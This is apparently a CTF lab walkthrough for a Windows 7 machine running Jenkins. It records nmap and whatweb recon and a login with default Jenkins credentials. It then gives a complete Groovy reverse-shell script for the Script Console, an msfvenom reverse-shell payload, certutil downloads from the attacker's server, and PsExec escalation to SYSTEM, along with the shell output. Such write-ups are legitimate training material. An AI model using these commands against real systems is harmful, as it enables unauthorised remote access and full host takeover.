## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.215.178
# HOSTNAME //Found Post Initial Enumeration
alfred
# OPERATING SYSTEM //Found Post Initial Enumeration
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
# CREDENTIALS  //Found on Web Enumeration 
admin:admin // Jenkins
```
## OPEN PORTS DETAILS
```bash
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 7.5
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Service
8080/tcp open  http          syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
```
# ENUMERATION
## PORT 80
```bash
# Recon
Email[alfred@wayneenterprises.com],
HTTPServer[Microsoft-IIS/7.5], Microsoft-IIS[7.5]

#  Tools/Commands Used
sudo whatweb -v $url

```
## PORT 8080
```bash
# Recon
Cookies[JSESSIONID.54031379], 
HTML5, 
HTTPServer[Jetty(9.4.z-SNAPSHOT)],
HttpOnly[JSESSIONID.54031379],
Jenkins[2.190.1],
Jetty[9.4.z-SNAPSHOT],
PasswordField[j_password], 
Script [text/javascript], 
UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]

- Found Jenkins Login Page
- Default credentials admin:admin - Worked !!! 

#  Tools/Commands Used
sudo whatweb -v $url

```
## INITIAL FOOTHOLD
```bash
# Jenkins to Reverse Shell
- Dashboard > Manage Jenkins > Script Console
- Generate Groovy Reverse Shell script https://www.revshells.com/
- Set up listener 

# Listener
sudo rlwrap nc -nvlp 8080

# Revese Shell Script
String host="10.11.127.94";int port=80;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

- Paste and Run on the Script Console

sudo rlwrap nc -nvlp 8080           
listening on [any] 8080 ...              
connect to [10.11.127.94] from (UNKNOWN) [10.10.215.178] 49219
Microsoft Windows [Version 6.1.7601]                                                          
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami                                                         
whoami
alfred\bruce     
```
## PRIVILEGE ESCALATION
```bash
# User is the member of Administrator Group
net user bruce
Local Group Memberships      *Administrators 

# Impersonate as Administrator User
- Create a Reverse Shell payload and Transfer
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.127.94 LPORT=8080 -f exe -o rev.exe
- Transfer PsExec64.exe from sysinternals suite

- Host web server to transfer
sudo python3 -m http.server 80

certutil -f -urlcache http://10.11.127.94/rev.exe C:\Windows\Tasks\rev.exe
certutil -f -urlcache http://10.11.127.94/PsExec64.exe C:\Windows\Tasks\PsExec64.exe

- Start a Listener on port 8080
sudo rlwrap nc -nvlp 8080

C:\Windows\Tasks>.\PsExec64.exe -accepteula -i -s C:\Windows\Tasks\rev.exe

udo rlwrap nc -nvlp 8080                                                                 
[sudo] password for kali:                                                                     
listening on [any] 8080 ...                                                                   
connect to [10.11.127.94] from (UNKNOWN) [10.10.215.178] 49240                                
Microsoft Windows [Version 6.1.7601]                                                          
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                               

C:\Windows\system32>whoami                                                                    
whoami                                                                                        
nt authority\system                 
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Mon Feb 24 08:41:32 2025 as: /usr/lib/nmap/nmap -Pn -p- -sC -sV -vv -oN nmap/scan-script-version 10.10.215.178
Nmap scan report for 10.10.215.178
Host is up, received user-set (0.17s latency).
Scanned at 2025-02-24 08:41:34 IST for 221s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Service
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-02-23T03:10:52
| Not valid after:  2025-08-25T03:10:52
| MD5:   842d:8e73:67bc:bb13:0b6e:a81b:0bab:8feb
| SHA-1: 3b43:4ff2:449e:4630:4dc5:1440:9d55:8041:3617:57f1
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQe4IMU9ljE45MiY72NpdxXDANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZhbGZyZWQwHhcNMjUwMjIzMDMxMDUyWhcNMjUwODI1MDMxMDUy
| WjARMQ8wDQYDVQQDEwZhbGZyZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDLNgJTnJgx7sVcl0KCJZGcN4AvyvlZWR02dVxuzhLtKTh9qWT1KF6BSAJV
| 2p8v1Ko2Une3fZmp1p1kiEVC6iKieEBrThjoFJqVI1uHRiCos9+kTVWjibamnxy3
| RXJxUZO9Frt1IU0Pd1y5R/3+3JFrqcWN3FZhJ7uYf5ogsvsNqhd6Oa8T7exRQN+1
| aIj7EpbiV/NHaD7Upc+jhJbdpG7hGB5Rv+Nf6ln65NrFKf9tRSOXrWXil8QKxdbq
| sd4CrMh2U+3sefv9UU6RZp2xQNA2OyWamP6LQNYBZOzFAhQZzEjSc+ksQPXxQa2+
| GKwhZecUSFPBPsmWW+ojElROsAEFAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEASjZTgzUG2SWec/Ax
| GJkwStPyidaL2Ql4miFsNQha99biYqZ5YrKIcnjSe613CxkQVEKGdsMt5xjvsvza
| wrgpEBkxh2yMawKyu4Syxo/yUEgQUI64CgXRHbXwdM67zE/Og1PoHxlrS0y7DBFU
| DmWm28HetGuVQSud7X7WqQQcRByhZjEFjlIsxryTxc7/buofwaLmaVXpopOtGPwX
| K2tzRz/cTl6GaXUeaBA2p5fiFephnSabmH9i8csnsaxdYhTZlvAMjPZJ5uaZFBIK
| RE//vA9HhZC1EDpngSmITIMIwnQNn/Qg+oAWy1HyYiLOHGQw4ffVHc9euiDJXPSr
| 8b2zHA==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-02-24T03:14:55+00:00; -20s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2025-02-24T03:14:50+00:00
8080/tcp open  http          syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20s, deviation: 0s, median: -20s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 24 08:45:15 2025 -- 1 IP address (1 host up) scanned in 223.07 seconds
```

